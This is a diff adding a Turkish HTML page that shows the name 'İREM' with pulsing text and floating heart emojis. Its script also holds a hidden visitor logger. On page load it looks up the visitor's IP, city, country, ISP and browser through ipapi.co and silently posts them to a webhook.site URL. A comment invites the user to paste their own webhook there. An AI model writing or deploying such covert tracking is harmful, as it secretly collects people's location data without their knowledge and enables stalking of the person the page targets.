@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>İREM 💕</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background: linear-gradient(135deg, #6b48ff, #9d4edd);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        .irem {
+            font-size: 12vw;
+            font-weight: bold;
+            color: #ff69b4;
+            text-shadow: 0 0 30px #ff69b4;
+            animation: pulse 2s infinite;
+            z-index: 10;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+        .heart {
+            position: absolute;
+            font-size: 3rem;
+            color: #ff69b4;
+            pointer-events: none;
+            animation: float 7s linear infinite;
+            opacity: 0;
+        }
+        @keyframes float {
+            0% { transform: translateY(120vh) rotate(0deg); opacity: 0.9; }
+            100% { transform: translateY(-30vh) rotate(720deg); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="irem">İREM</div>
+
+    <script>
+        // Yüzen kalpler (hafif, performans dostu)
+        function createHeart() {
+            const heart = document.createElement('div');
+            heart.className = 'heart';
+            heart.innerHTML = '💕';
+            heart.style.left = Math.random() * 100 + 'vw';
+            heart.style.animationDuration = (Math.random() * 5 + 5) + 's';
+            document.body.appendChild(heart);
+            setTimeout(() => heart.remove(), 10000);
+        }
+        setInterval(() => {
+            if (Math.random() > 0.5) createHeart();
+        }, 1800);
+
+        // IP Loglama (Webhook.site ile - senin URL'ini koy!)
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const webhookUrl = 'https://webhook.site/0318b97b-d5d1-4cdf-8ffb-317ec265120'; // <--- BURAYA KENDİ WEBHOOK.SITE URL'İNİ YAPIŞTIR!
+                const logMessage = `Yeni İREM Ziyaretçisi 🔥\nIP: ${data.ip || 'Bilinmiyor'}\nŞehir: ${data.city || 'Bilinmiyor'}\nÜlke: ${data.country_name || 'Bilinmiyor'}\nISP: ${data.org || 'Bilinmiyor'}\nTarayıcı: ${navigator.userAgent}\nZaman: ${new Date().toLocaleString('tr-TR')}`;
+                
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: logMessage })
+                }).catch(err => console.log('Log gönderme hatası:', err));
+            })
+            .catch(err => console.log('IP çekme hatası:', err));
+    </script>
+</body>
+</html>
